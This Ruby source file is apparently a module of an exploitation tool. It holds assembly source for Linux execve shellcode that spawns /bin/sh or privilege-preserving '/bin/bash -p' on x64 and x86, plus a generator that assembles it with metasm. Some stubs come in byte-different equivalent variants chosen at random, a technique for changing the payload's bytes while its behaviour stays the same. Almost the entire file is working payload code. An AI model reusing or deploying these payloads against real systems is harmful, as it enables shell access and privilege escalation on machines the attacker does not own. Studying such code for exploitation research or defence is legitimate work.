# frozen_string_literal: true

require "metasm"

module AugureProfiler
  # The target's word size, from the ELF class: which shellcode variant
  # to assemble and how wide the return address is.
  def self.arch(path)
    elf = Metasm::ELF.decode_file(path)
    (elf.header.e_class.to_s == "64") ? :x64 : :x86
  end

  # The payload source: assembly TEXT, versioned and auditable, assembled
  # on demand. No hex blobs - the shellcode of the original tool (%shc in
  # dbg.pm) becomes readable source assembled by metasm, which the
  # profiler already depends on. The call-back layout keeps every stub
  # position-independent without relocations.
  #
  # Each stub carries EQUIVALENT VARIANTS (the ghost-writing idea from
  # the metasm talks): same semantics, different bytes. rng: a seeded
  # Random - the variant picked is deterministic per seed, so the audit
  # can reproduce the exact payload.
  module Shellcode
    SOURCES = {
      sh: {
        x64: [
          <<~ASM,
            call shellcode
            path:
              db "/bin/sh", 0
            shellcode:
              pop rdi
              xor esi, esi
              xor edx, edx
              push 59
              pop rax
              syscall
          ASM
          <<~ASM
            call shellcode
            path:
              db "/bin/sh", 0
            shellcode:
              pop rdi
              push 0
              pop rsi
              push 59
              pop rax
              cdq
              syscall
          ASM
        ],
        x86: [
          <<~ASM,
            call shellcode
            path:
              db "/bin/sh", 0
            shellcode:
              pop ebx
              xor ecx, ecx
              push 11
              pop eax
              int 80h
          ASM
          <<~ASM
            call shellcode
            path:
              db "/bin/sh", 0
            shellcode:
              pop ebx
              push 11
              pop eax
              cdq
              xor ecx, ecx
              int 80h
          ASM
        ]
      },
      bash: {
        x64: [
          <<~ASM
            call shellcode
            path:
              db "/bin/bash", 0
            arg:
              db "-p", 0
            shellcode:
              pop rdi
              lea rsi, [rdi+10]
              push 0
              mov rdx, rsp
              push rsi
              push rdi
              mov rsi, rsp
              pop rdi
              mov eax, 59
              syscall
          ASM
        ],
        x86: [
          <<~ASM
            call shellcode
            path:
              db "/bin/bash", 0
            arg:
              db "-p", 0
            shellcode:
              pop ebx
              lea ecx, [ebx+10]
              push 0
              mov edx, esp
              push ecx
              push ebx
              mov ecx, esp
              mov eax, 11
              int 80h
          ASM
        ]
      }
    }.freeze

    # klass: Metasm::X64 or Metasm::Ia32 (the target architecture).
    # Returns the assembled bytes.
    def self.generate(klass, stub = :sh, rng: nil)
      arch = (klass == Metasm::X64) ? :x64 : :x86
      variants = SOURCES.fetch(stub).fetch(arch)
      source = rng ? variants.sample(random: rng) : variants.first
      Metasm::Shellcode.assemble(klass.new, source).encode_string
    end
  end
end
